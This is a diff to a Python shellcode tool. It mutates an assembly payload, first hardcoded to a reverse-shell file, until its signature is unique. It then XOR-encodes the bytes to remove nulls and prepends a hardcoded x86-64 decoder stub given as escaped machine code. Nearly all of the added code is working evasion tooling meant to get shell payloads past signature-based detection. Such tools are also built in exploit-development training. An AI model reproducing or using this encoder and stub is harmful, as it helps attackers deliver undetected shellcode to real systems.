@@ -1,4 +1,5 @@
 import json
+import sys
 import subprocess
 from random import randint
 import os.path as os_path
@@ -20,6 +21,8 @@ KNOWN_ASM_INSTRUCTIONS = {
     "_start:": {"parsing_args": [], "equivalent_mods": []},
     }
 
+ENCODER_STUD = "\\xeb\\x5f\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x5e\\xbf\\x90\\x90\\xaa\\xaa\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x48\\x83\\xec\\x7f\\x8a\\x5c\\x16\\x01\\x8a\\x7c\\x16\\x02\\x8a\\x4c\\x16\\x03\\x8a\\x6c\\x16\\x04\\x32\\x1c\\x16\\x32\\x3c\\x16\\x32\\x0c\\x16\\x32\\x2c\\x16\\x88\\x2c\\x04\\x88\\x4c\\x04\\x01\\x88\\x7c\\x04\\x02\\x88\\x5c\\x04\\x03\\x39\\x7c\\x16\\x05\\x74\\x0a\\x48\\x83\\xc2\\x05\\x48\\x83\\xc0\\x04\\x75\\xc5\\xff\\xe4\\xe8\\x9c\\xff\\xff\\xff"
+ASM_HELPER_FILE = "asm_helper.json"
 
 # Parses asm instructions line, returns Dict with parsed instructions
 def parse_asm_instructions(instructions):
@@ -306,22 +309,67 @@ def check_is_unique(gen_parsed_asm, asm_file_path):
     gen_asm_signature = get_signature(gen_asm_bytes)
     for signature in gen_parsed_asm["signatures"]:
         if signature == gen_asm_signature:
-            return False
+            return False, None
 
     add_signature(asm_file_path, gen_asm_signature)
-    return True
+    return True, gen_asm_bytes_string
 
+def encode_shell_code(shell_code_bytes_strings):
+    bytes_to_xor = 4
+    shell_code_bytes = bytes_string_to_byte_array(shell_code_bytes_strings)
+
+    # If shellcode is not 4 bytes aligned, add padding bytes at the end
+    if len(shell_code_bytes) % bytes_to_xor != 0:
+        padding = bytes_to_xor - (len(shell_code_bytes) % bytes_to_xor)
+        for i in range(0, padding):
+                shell_code_bytes.append(0x90)
+
+    shell_code_encoded = bytearray()
+
+    for i in range(0, len(shell_code_bytes), bytes_to_xor):
+        xor_byte_good = False
+        while(xor_byte_good == False):
+                check_byte = True
+                # Generate random XOR byte
+                r = randint(1,255)
+                # Check that resulting shellcode doesn't contain null bytes
+                for j in range(bytes_to_xor):
+                    if (r ^ shell_code_bytes[i+j] == 0):
+                            check_byte = False
+                if check_byte:
+                    xor_byte_good = True
+
+
+        # Encoded shellcode contains XOR byte + next bytes_to_xor bytes reversed
+        shell_code_encoded.append(r)
+        for k in range(bytes_to_xor-1, -1, -1):
+            shell_code_encoded.append(shell_code_bytes[i+k] ^ r)
+        
+        # Add end of shellcode marker
+    shell_code_encoded.append(0x90)
+    shell_code_encoded.append(0x90)
+    shell_code_encoded.append(0xaa)
+    shell_code_encoded.append(0xaa)
+
+    shell_code_encoded_hex = ''.join('\\x{:02x}'.format(x) for x in shell_code_encoded)
+    #shellcode_encoded_nasm = ''.join('0x{:02x},'.format(x) for x in shell_code_encoded).rstrip(',')
+    print(f"Original ShellCode: {shell_code_bytes_strings}\n")
+    print(f"Encoded ShellCode: {shell_code_encoded_hex}\n")
+    print(f"Encoder Stud + Encoded ShellCode: {ENCODER_STUD+shell_code_encoded_hex}")
 
 if __name__ == '__main__':
-    with open("asm_helper.json", 'r') as f:
+    if len(sys.argv) < 2:
+        print('Usage: {name} [shellcode_file]'.format(name = sys.argv[0]))
+        exit(1)
+
+    shell_code_file = sys.argv[1]
+
+    with open(ASM_HELPER_FILE, 'r') as f:
         KNOWN_ASM_INSTRUCTIONS = json.load(f)
     
     gen_is_unique = False
     while not gen_is_unique:
-        gen_parsed_asm = morph_code("../test/reverse_shell.asm")
-        gen_is_unique = check_is_unique(gen_parsed_asm, "../test/reverse_shell.asm")
+        gen_parsed_asm = morph_code(shell_code_file)
+        gen_is_unique, bytes_strings = check_is_unique(gen_parsed_asm, shell_code_file)
     
-    
-
-
-    #print(parse_asm("mod_rev.asm")["payload"])
+    encode_shell_code(bytes_strings)
